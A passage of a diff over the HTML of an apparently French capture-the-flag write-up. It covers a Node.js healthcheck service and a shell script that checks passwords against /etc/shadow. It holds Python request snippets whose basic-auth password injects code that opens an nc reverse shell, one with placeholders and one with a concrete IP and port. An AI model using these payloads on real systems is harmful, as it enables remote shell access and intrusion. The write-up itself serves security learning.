+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">,[</span><span class="s1">&#39;/var/log/httpd/error_log&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+<span class="p">})</span>
 
 <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/active-connections&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/netstat&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;-laputen&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
-<span class="p">}</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/netstat&#39;</span><span class="p">,[</span><span class="s1">&#39;-laputen&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+<span class="p">})</span>
 
-<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">(</span><span class="p">)</span> <span class="p">=&gt;</span>
-  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`</span><span class="sb">Healthcheck app listening on port </span><span class="si">${</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">!</span><span class="sb">`</span><span class="p">)</span><span class="p">,</span>
-<span class="p">)</span><span class="p">;</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Healthcheck app listening on port </span><span class="si">${</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">!`</span><span class="p">),</span>
+<span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Il s&rsquo;agit d&rsquo;un healthcheck sur le port 3000 avec authentification via basic-auth. On n&rsquo;a pas les droits pour modifier ces fichiers donc la seule piste actuelle serait d&rsquo;effectuer une injection via ce que fait le serveur.</p>
@@ -600,7 +600,7 @@ cat flag
 <span class="nv">IFS</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
 
 <span class="nv">shadow_line</span><span class="o">=</span><span class="k">$(</span>cat /etc/shadow <span class="p">|</span> grep <span class="nv">$1</span><span class="k">)</span>
-python3 -c <span class="s2">&#34;</span><span class="s2">import crypt;salt=&#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;\$6\$&#39;)[1].split(&#39;</span>$<span class="s2">&#39;)[0];hash = crypt.crypt(&#39;</span><span class="nv">$PASSWORD</span><span class="s2">&#39;, &#39;\$6\$&#39;+salt+&#39;</span>$<span class="s2">&#39;);print(hash == &#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;:&#39;)[1],end=&#39;&#39;)</span><span class="s2">&#34;</span>
+python3 -c <span class="s2">&#34;import crypt;salt=&#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;\$6\$&#39;)[1].split(&#39;</span>$<span class="s2">&#39;)[0];hash = crypt.crypt(&#39;</span><span class="nv">$PASSWORD</span><span class="s2">&#39;, &#39;\$6\$&#39;+salt+&#39;</span>$<span class="s2">&#39;);print(hash == &#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;:&#39;)[1],end=&#39;&#39;)&#34;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>On se retrouve donc face à un script plutôt&hellip; Sale. Mais intéréssant !</p>
@@ -646,9 +646,9 @@ python3 -c <span class="s2">&#34;</span><span class="s2">import crypt;salt=&#39;
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">http://localhost:3000/ping</span><span class="s2">&#34;</span><span class="p">,</span> 
-                 <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="p">}</span><span class="p">,</span> 
-                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">root</span><span class="s2">&#34;</span><span class="p">,</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">&#39;</span><span class="s2">,</span><span class="s2">&#39;</span><span class="s2">&#39;</span><span class="s2">);import os;os.system(</span><span class="s2">&#39;</span><span class="s2">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f</span><span class="s2">&#39;</span><span class="s2">)#</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://localhost:3000/ping&#34;</span><span class="p">,</span> 
+                 <span class="n">data</span><span class="o">=</span><span class="p">{},</span> 
+                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;,&#39;&#39;);import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;)#&#34;</span><span class="p">)</span>
                 <span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
@@ -663,9 +663,9 @@ python3 -c <span class="s2">&#34;</span><span class="s2">import crypt;salt=&#39;
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">http://localhost:3000/ping</span><span class="s2">&#34;</span><span class="p">,</span>
-                 <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="p">}</span><span class="p">,</span>
-                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">web-dev</span><span class="s2">&#34;</span><span class="p">,</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">&#39;</span><span class="s2">,</span><span class="s2">&#39;</span><span class="s2">&#39;</span><span class="s2">);import os;os.system(</span><span class="s2">&#39;</span><span class="s2">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.17.0.1 51338 &gt;/tmp/f</span><span class="s2">&#39;</span><span class="s2">)#</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://localhost:3000/ping&#34;</span><span class="p">,</span>
+                 <span class="n">data</span><span class="o">=</span><span class="p">{},</span>
+                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;web-dev&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;,&#39;&#39;);import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.17.0.1 51338 &gt;/tmp/f&#39;)#&#34;</span><span class="p">)</span>
                 <span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
